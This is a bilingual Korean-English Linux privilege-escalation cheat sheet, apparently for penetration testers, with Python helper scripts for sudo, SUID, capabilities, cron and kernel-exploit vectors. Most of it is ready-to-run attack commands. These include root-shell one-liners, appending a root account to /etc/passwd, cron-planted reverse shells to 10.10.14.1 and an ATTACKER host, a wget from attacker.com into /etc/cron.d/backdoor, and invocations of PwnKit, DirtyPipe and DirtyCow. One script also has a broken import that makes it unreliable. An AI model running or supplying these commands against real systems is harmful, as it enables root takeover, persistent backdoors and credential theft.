> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# Linux 권한 상승 — sudo·SUID·Capabilities·커널 익스플로잇

## 0. 초보자를 위한 개념 이해

### 권한 상승(Privilege Escalation)이란?

권한 상승은 낮은 권한의 계정(일반 사용자)에서 높은 권한(root 또는 관리자)을 획득하는 기법입니다. 침투 테스트에서 초기 접근 후 시스템을 완전히 장악하기 위한 필수 단계입니다.

**왜 배우는가:**
```
침투 테스트 시나리오:

  [초기 접근]               [권한 상승]              [완전 장악]
  일반 계정 획득     →→→    root 권한 획득    →→→    시스템 전체 제어
  (www-data, user)          (SUID, sudo 오설정)       (passwd 수정, 백도어)

권한 상승이 필요한 이유:
  일반 사용자: /etc/shadow 읽기 불가, 시스템 설정 변경 불가
  root 사용자: 모든 파일 접근, 모든 프로세스 제어, 백도어 설치
```

### 핵심 개념 정리

```
Linux 권한 구조:

  UID 0    = root (슈퍼유저 — 모든 것 가능)
  UID 1-999 = 시스템 계정 (서비스 실행용)
  UID 1000+ = 일반 사용자

권한 상승 주요 경로:
  ┌────────────────────────────────────────┐
  │  sudo 오설정  → sudo 허용 명령어로 쉘 획득   │
  │  SUID 파일    → root 권한으로 실행되는 파일  │
  │  Cron 작업    → root가 실행하는 스크립트 변조 │
  │  커널 익스플로잇 → 구버전 커널 취약점 사용    │
  │  쓰기 가능 파일  → /etc/passwd 직접 수정     │
  └────────────────────────────────────────┘

SUID 비트란?
  -rwsr-xr-x  ← 's'가 실행 권한 자리에 = SUID 설정됨
  이 파일을 실행하면 파일 소유자(보통 root)의 권한으로 실행됨
```

### 필요한 도구 및 환경
- **리눅스 시스템**: 낮은 권한 계정으로 SSH 접속된 상태
- **열거 스크립트**: 시스템 취약점을 자동으로 찾아주는 자동화 도구
- **GTFOBins**: SUID/sudo 악용 가능한 바이너리 데이터베이스 (gtfobins.github.io)

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""리눅스 권한 상승 가능 경로 자동 탐색 스크립트."""
import subprocess
import os
from typing import list

def find_suid_files() -> list[str]:
    """SUID 비트 설정된 파일 목록 반환."""
    result = subprocess.run(
        ["find", "/", "-perm", "-4000", "-type", "f"],
        capture_output=True,
        text=True,
        timeout=30,
    )
    return [line.strip() for line in result.stdout.splitlines() if line.strip()]

def check_sudo_permissions() -> str:
    """현재 사용자의 sudo 허용 명령어 확인."""
    result = subprocess.run(
        ["sudo", "-l"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    return result.stdout

def check_writable_cron() -> list[str]:
    """쓰기 가능한 cron 관련 파일 탐색."""
    cron_paths = ["/etc/crontab", "/etc/cron.d", "/var/spool/cron"]
    writable = []
    for path in cron_paths:
        if os.access(path, os.W_OK):
            writable.append(path)
    return writable

if __name__ == "__main__":
    print("[*] SUID 파일 검색 중...")
    for f in find_suid_files():
        print(f"  [SUID] {f}")

    print("\n[*] sudo 권한 확인...")
    print(check_sudo_permissions())

    print("\n[*] 쓰기 가능 cron 파일...")
    for path in check_writable_cron():
        print(f"  [WRITE] {path}")
```

---

## 1. 권한 상승 체크리스트

```bash
# LinPEAS 자동 열거 (최우선)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 수동 열거 순서
whoami && id                              # 현재 권한
cat /etc/passwd | grep sh$               # 로그인 가능 사용자
sudo -l                                  # sudo 허용 명령어
find / -perm -4000 -type f 2>/dev/null   # SUID 파일
find / -perm -2000 -type f 2>/dev/null   # SGID 파일
getcap -r / 2>/dev/null                  # Capabilities
cat /etc/crontab; ls /etc/cron*          # Cron 작업
ss -tlnp; netstat -tlnp                  # 내부 리스닝 포트
uname -r; cat /etc/*release              # 커널 버전
```

---

## 2. sudo 악용

### 2.1 GTFOBins 기반

```bash
# sudo -l 결과 예시
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
sudo vim -c ':py3 import os; os.execl("/bin/bash","bash","-p")'

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# find
sudo find / -exec /bin/bash -p \; -quit

# python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# wget — 파일 쓰기로 cron 추가
sudo wget http://attacker.com/evil -O /etc/cron.d/backdoor

# apt-get
sudo apt-get changelog apt  # 실행 후 !bash
```

### 2.2 sudo 버전 취약점

```bash
# CVE-2021-3156 — sudo heap overflow (sudo < 1.9.5p2)
sudoedit -s '\' $(python3 -c 'print("A"*65536)')
# 익스플로잇: https://github.com/blasty/CVE-2021-3156

# CVE-2019-14287 — sudo -u#-1 (sudo < 1.8.28)
sudo -u#-1 /bin/bash
```

---

## 3. SUID 바이너리 악용

```python
#!/usr/bin/env python3
"""SUID/SGID 바이너리 자동 분석 — GTFOBins 매칭 CLI."""

import argparse
import os
import stat
import subprocess
from pathlib import Path


GTFOBINS_SUID = {
    "bash": "bash -p",
    "vim": "vim -c ':!/bin/bash -p'",
    "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "perl": "perl -e 'use POSIX (setuid); setuid(0); exec \"/bin/bash -p\"'",
    "find": "find / -exec /bin/bash -p \\; -quit",
    "nmap": "nmap --interactive  # (구버전)",
    "cp": "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p",
    "tee": "echo 'user:$(python3 -c \"import crypt; print(crypt.crypt(\\\"pass\\\"))\"):0:0:root:/root:/bin/bash' | tee -a /etc/passwd",
    "awk": "awk 'BEGIN {system(\"/bin/bash -p\")}'",
    "less": "less /etc/passwd  # 실행 후 !bash -p",
    "more": "more /etc/passwd  # 실행 후 !bash -p",
    "dd": "echo '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1' | dd of=/etc/cron.d/backdoor",
    "nano": "nano  # 실행 후 ^R^X, reset; sh 1>&0 2>&0",
    "cat": "LFILE=/etc/shadow; cat $LFILE",
    "curl": "curl file:///etc/shadow",
}


def find_suid_files(search_path: str = "/") -> list[Path]:
    suid_files = []
    for root, dirs, files in os.walk(search_path, onerror=lambda e: None):
        dirs[:] = [d for d in dirs if d not in {"proc", "sys", "dev"}]
        for fname in files:
            fpath = Path(root) / fname
            try:
                mode = fpath.stat().st_mode
                if mode & stat.S_ISUID:
                    suid_files.append(fpath)
            except (PermissionError, OSError):
                pass
    return suid_files


def analyze_suid(suid_files: list[Path]) -> list[dict]:
    results = []
    for fpath in suid_files:
        name = fpath.name
        exploit = GTFOBINS_SUID.get(name)
        results.append({
            "path": str(fpath),
            "name": name,
            "known_exploit": bool(exploit),
            "exploit_cmd": exploit or "미발견 — GTFOBins 직접 확인",
        })
    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="SUID 바이너리 분석")
    parser.add_argument("--path", default="/", help="검색 경로")
    parser.add_argument("--exploitable-only", action="store_true")
    args = parser.parse_args()

    print(f"[*] SUID 파일 탐색 중: {args.path}")
    suid_files = find_suid_files(args.path)
    results = analyze_suid(suid_files)

    if args.exploitable_only:
        results = [r for r in results if r["known_exploit"]]

    print(f"\n발견 {len(suid_files)}개 / 익스플로잇 가능 {sum(r['known_exploit'] for r in results)}개\n")
    for r in results:
        icon = "[!]" if r["known_exploit"] else "[ ]"
        print(f"{icon} {r['path']}")
        if r["known_exploit"]:
            print(f"    → {r['exploit_cmd']}")


if __name__ == "__main__":
    main()
```

---

## 4. Capabilities 악용

```bash
# Capabilities 열거
getcap -r / 2>/dev/null

# 위험한 Capabilities
# cap_setuid+ep  — setuid() 호출 가능
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# cap_net_raw+ep — raw 소켓 (패킷 스니핑)
tcpdump -i any -w /tmp/capture.pcap

# cap_dac_read_search+ep — 파일 읽기 권한 무시
./tar cf /dev/null /root/.ssh/id_rsa  # 읽기 성공

# cap_fowner+ep — 파일 소유권 무시
chmod 777 /etc/shadow
```

---

## 5. Cron 작업 악용

```bash
# cron 파일 쓰기 가능 여부
ls -la /etc/cron* /var/spool/cron/

# cron.d에 쓰기 가능하면 역쉘 추가
echo '* * * * * root bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' \
  > /etc/cron.d/backdoor

# PATH 조작 — cron 스크립트가 상대 경로로 실행하는 경우
cat /etc/crontab  # PATH 확인
echo '#!/bin/bash' > /usr/local/bin/vulnerable_script
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/vulnerable_script
chmod +x /usr/local/bin/vulnerable_script

# 와일드카드 인젝션 — cron에서 tar * 사용 시
touch /var/backup/--checkpoint=1
touch /var/backup/--checkpoint-action=exec=sh\ shell.sh
```

---

## 6. 커널 익스플로잇

```bash
# 커널 버전 확인
uname -r
cat /proc/version

# 취약한 커널 버전 확인
# CVE-2022-0847 (DirtyPipe) — Linux 5.8~5.16.11
python3 dirtypipe.py /etc/passwd  # /etc/passwd에 root 쉘 추가

# CVE-2021-4034 (PwnKit) — pkexec < 0.120
./PwnKit  # GLIBC 없는 정적 바이너리

# CVE-2016-5195 (DirtyCow) — Linux < 4.8.3
./dcow /etc/passwd

# 자동 커널 익스플로잇 탐색
./linux-exploit-suggester.sh
./linux-exploit-suggester-2.py
```

```python
#!/usr/bin/env python3
"""Linux 권한 상승 자동 체크 CLI."""

import argparse
import os
import subprocess
import re
from pathlib import Path


def check_sudo_permissions() -> list[str]:
    try:
        result = subprocess.run(
            ["sudo", "-l"], capture_output=True, text=True, timeout=5
        )
        return result.stdout.splitlines()
    except Exception:
        return []


def check_writable_paths() -> list[str]:
    dangerous_paths = [
        "/etc/cron.d", "/etc/crontab", "/etc/cron.hourly",
        "/etc/passwd", "/etc/shadow", "/etc/sudoers",
        "/var/spool/cron", "/tmp",
    ]
    writable = []
    for path in dangerous_paths:
        if os.access(path, os.W_OK):
            writable.append(path)
    return writable


def check_env_variables() -> dict:
    interesting = {}
    for key, val in os.environ.items():
        if any(k in key.upper() for k in ["PATH", "LD_", "PYTHONPATH", "HOME"]):
            interesting[key] = val
    return interesting


def get_kernel_version() -> str:
    result = subprocess.run(["uname", "-r"], capture_output=True, text=True)
    return result.stdout.strip()


def main() -> None:
    parser = argparse.ArgumentParser(description="Linux 권한 상승 자동 체크")
    parser.add_argument("--all", action="store_true", help="전체 체크 실행")
    args = parser.parse_args()

    print(f"[*] 현재 사용자: {os.getenv('USER', 'unknown')} (UID={os.getuid()})")
    print(f"[*] 커널 버전: {get_kernel_version()}")

    print("\n[*] sudo 권한 확인...")
    sudo_perms = check_sudo_permissions()
    for line in sudo_perms:
        if "NOPASSWD" in line or "ALL" in line:
            print(f"  [!] {line.strip()}")

    print("\n[*] 쓰기 가능한 민감 경로...")
    writable = check_writable_paths()
    for path in writable:
        print(f"  [!] {path}")

    print("\n[*] 환경 변수...")
    for k, v in check_env_variables().items():
        print(f"  {k}={v}")


if __name__ == "__main__":
    main()
```

---

## 7. 참고 도구

| 도구 | 용도 |
|------|------|
| `LinPEAS` | 자동 열거·권한 상승 벡터 탐색 |
| `linux-exploit-suggester` | 커널 취약점 제안 |
| `GTFOBins` | SUID/sudo 바이너리 악용 DB |
| `pspy` | 프로세스 감시 (cron 탐지) |
| `linenum.sh` | 권한 상승 체크리스트 |

---

<a name="english"></a>

# Linux Privilege Escalation — sudo · SUID · Capabilities · Kernel Exploits

## 1. Privilege Escalation Checklist

```bash
# LinPEAS automated enumeration (top priority)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual enumeration order
whoami && id                              # Current privileges
cat /etc/passwd | grep sh$               # Login-capable users
sudo -l                                  # Allowed sudo commands
find / -perm -4000 -type f 2>/dev/null   # SUID files
find / -perm -2000 -type f 2>/dev/null   # SGID files
getcap -r / 2>/dev/null                  # Capabilities
cat /etc/crontab; ls /etc/cron*          # Cron jobs
ss -tlnp; netstat -tlnp                  # Internal listening ports
uname -r; cat /etc/*release              # Kernel version
```

---

## 2. sudo Abuse

### 2.1 GTFOBins-Based

```bash
# Example sudo -l output
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
sudo vim -c ':py3 import os; os.execl("/bin/bash","bash","-p")'

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# find
sudo find / -exec /bin/bash -p \; -quit

# python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# wget — add cron entry via file write
sudo wget http://attacker.com/evil -O /etc/cron.d/backdoor

# apt-get
sudo apt-get changelog apt  # then type !bash
```

### 2.2 sudo Version Vulnerabilities

```bash
# CVE-2021-3156 — sudo heap overflow (sudo < 1.9.5p2)
sudoedit -s '\' $(python3 -c 'print("A"*65536)')
# Exploit: https://github.com/blasty/CVE-2021-3156

# CVE-2019-14287 — sudo -u#-1 (sudo < 1.8.28)
sudo -u#-1 /bin/bash
```

---

## 3. SUID Binary Abuse

```python
#!/usr/bin/env python3
"""Automated SUID/SGID binary analysis — GTFOBins matching CLI."""

import argparse
import os
import stat
import subprocess
from pathlib import Path


GTFOBINS_SUID = {
    "bash": "bash -p",
    "vim": "vim -c ':!/bin/bash -p'",
    "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "perl": "perl -e 'use POSIX (setuid); setuid(0); exec \"/bin/bash -p\"'",
    "find": "find / -exec /bin/bash -p \\; -quit",
    "nmap": "nmap --interactive  # (older versions)",
    "cp": "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p",
    "tee": "echo 'user:$(python3 -c \"import crypt; print(crypt.crypt(\\\"pass\\\"))\"):0:0:root:/root:/bin/bash' | tee -a /etc/passwd",
    "awk": "awk 'BEGIN {system(\"/bin/bash -p\")}'",
    "less": "less /etc/passwd  # then type !bash -p",
    "more": "more /etc/passwd  # then type !bash -p",
    "dd": "echo '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1' | dd of=/etc/cron.d/backdoor",
    "nano": "nano  # then ^R^X, reset; sh 1>&0 2>&0",
    "cat": "LFILE=/etc/shadow; cat $LFILE",
    "curl": "curl file:///etc/shadow",
}


def find_suid_files(search_path: str = "/") -> list[Path]:
    suid_files = []
    for root, dirs, files in os.walk(search_path, onerror=lambda e: None):
        dirs[:] = [d for d in dirs if d not in {"proc", "sys", "dev"}]
        for fname in files:
            fpath = Path(root) / fname
            try:
                mode = fpath.stat().st_mode
                if mode & stat.S_ISUID:
                    suid_files.append(fpath)
            except (PermissionError, OSError):
                pass
    return suid_files


def analyze_suid(suid_files: list[Path]) -> list[dict]:
    results = []
    for fpath in suid_files:
        name = fpath.name
        exploit = GTFOBINS_SUID.get(name)
        results.append({
            "path": str(fpath),
            "name": name,
            "known_exploit": bool(exploit),
            "exploit_cmd": exploit or "Not found — check GTFOBins directly",
        })
    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="SUID binary analysis")
    parser.add_argument("--path", default="/", help="Search path")
    parser.add_argument("--exploitable-only", action="store_true")
    args = parser.parse_args()

    print(f"[*] Searching for SUID files in: {args.path}")
    suid_files = find_suid_files(args.path)
    results = analyze_suid(suid_files)

    if args.exploitable_only:
        results = [r for r in results if r["known_exploit"]]

    print(f"\nFound {len(suid_files)} / Exploitable {sum(r['known_exploit'] for r in results)}\n")
    for r in results:
        icon = "[!]" if r["known_exploit"] else "[ ]"
        print(f"{icon} {r['path']}")
        if r["known_exploit"]:
            print(f"    → {r['exploit_cmd']}")


if __name__ == "__main__":
    main()
```

---

## 4. Capabilities Abuse

```bash
# Enumerate capabilities
getcap -r / 2>/dev/null

# Dangerous capabilities
# cap_setuid+ep  — can call setuid()
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# cap_net_raw+ep — raw sockets (packet sniffing)
tcpdump -i any -w /tmp/capture.pcap

# cap_dac_read_search+ep — bypass file read permissions
./tar cf /dev/null /root/.ssh/id_rsa  # read succeeds

# cap_fowner+ep — bypass file ownership checks
chmod 777 /etc/shadow
```

---

## 5. Cron Job Abuse

```bash
# Check if cron files are writable
ls -la /etc/cron* /var/spool/cron/

# Add reverse shell if cron.d is writable
echo '* * * * * root bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' \
  > /etc/cron.d/backdoor

# PATH manipulation — when cron scripts execute with relative paths
cat /etc/crontab  # check PATH
echo '#!/bin/bash' > /usr/local/bin/vulnerable_script
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/vulnerable_script
chmod +x /usr/local/bin/vulnerable_script

# Wildcard injection — when cron uses tar *
touch /var/backup/--checkpoint=1
touch /var/backup/--checkpoint-action=exec=sh\ shell.sh
```

---

## 6. Kernel Exploits

```bash
# Check kernel version
uname -r
cat /proc/version

# Check for vulnerable kernel versions
# CVE-2022-0847 (DirtyPipe) — Linux 5.8~5.16.11
python3 dirtypipe.py /etc/passwd  # adds root shell to /etc/passwd

# CVE-2021-4034 (PwnKit) — pkexec < 0.120
./PwnKit  # static binary without GLIBC dependency

# CVE-2016-5195 (DirtyCow) — Linux < 4.8.3
./dcow /etc/passwd

# Automated kernel exploit search
./linux-exploit-suggester.sh
./linux-exploit-suggester-2.py
```

```python
#!/usr/bin/env python3
"""Automated Linux privilege escalation check CLI."""

import argparse
import os
import subprocess
import re
from pathlib import Path


def check_sudo_permissions() -> list[str]:
    try:
        result = subprocess.run(
            ["sudo", "-l"], capture_output=True, text=True, timeout=5
        )
        return result.stdout.splitlines()
    except Exception:
        return []


def check_writable_paths() -> list[str]:
    dangerous_paths = [
        "/etc/cron.d", "/etc/crontab", "/etc/cron.hourly",
        "/etc/passwd", "/etc/shadow", "/etc/sudoers",
        "/var/spool/cron", "/tmp",
    ]
    writable = []
    for path in dangerous_paths:
        if os.access(path, os.W_OK):
            writable.append(path)
    return writable


def check_env_variables() -> dict:
    interesting = {}
    for key, val in os.environ.items():
        if any(k in key.upper() for k in ["PATH", "LD_", "PYTHONPATH", "HOME"]):
            interesting[key] = val
    return interesting


def get_kernel_version() -> str:
    result = subprocess.run(["uname", "-r"], capture_output=True, text=True)
    return result.stdout.strip()


def main() -> None:
    parser = argparse.ArgumentParser(description="Automated Linux privilege escalation check")
    parser.add_argument("--all", action="store_true", help="Run all checks")
    args = parser.parse_args()

    print(f"[*] Current user: {os.getenv('USER', 'unknown')} (UID={os.getuid()})")
    print(f"[*] Kernel version: {get_kernel_version()}")

    print("\n[*] Checking sudo permissions...")
    sudo_perms = check_sudo_permissions()
    for line in sudo_perms:
        if "NOPASSWD" in line or "ALL" in line:
            print(f"  [!] {line.strip()}")

    print("\n[*] Writable sensitive paths...")
    writable = check_writable_paths()
    for path in writable:
        print(f"  [!] {path}")

    print("\n[*] Environment variables...")
    for k, v in check_env_variables().items():
        print(f"  {k}={v}")


if __name__ == "__main__":
    main()
```

---

## 7. Reference Tools

| Tool | Purpose |
|------|---------|
| `LinPEAS` | Automated enumeration and privilege escalation vector discovery |
| `linux-exploit-suggester` | Kernel vulnerability suggestions |
| `GTFOBins` | SUID/sudo binary abuse database |
| `pspy` | Process monitoring (cron detection) |
| `linenum.sh` | Privilege escalation checklist |
